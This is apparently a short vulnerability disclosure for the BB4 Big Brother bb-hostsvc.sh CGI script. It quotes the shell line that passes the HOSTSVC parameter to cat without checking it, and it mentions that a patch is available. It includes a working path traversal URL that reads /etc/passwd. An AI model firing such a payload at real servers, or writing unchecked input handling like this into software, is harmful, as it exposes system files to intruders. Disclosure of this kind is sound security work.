 The problem exists in the code where $HOSTSVC does not do authenticity
 checking for its assigned variable.

 ---- snip ----
 # get the color of the status from the status file
 set `$CAT "$BBLOGS/$HOSTSVC" | $HEAD -1` >/dev/null 2>&1 BKG="$1"
 ---- snap ----

 e.g. http://www.bb4.com/cgi-bin/bb-hostsvc.sh?HOSTSVC=/../../../../../../../../etc/passwd

 BB4 Technologies has already been notified and a patch is already out.
 It can be Downloaded from http://www.bb4.com/download.html

/* This exploit was found due to the mass intelligence and elite cow-people
*   ingenious of Safety and his esteemed apprentice cow Loki.
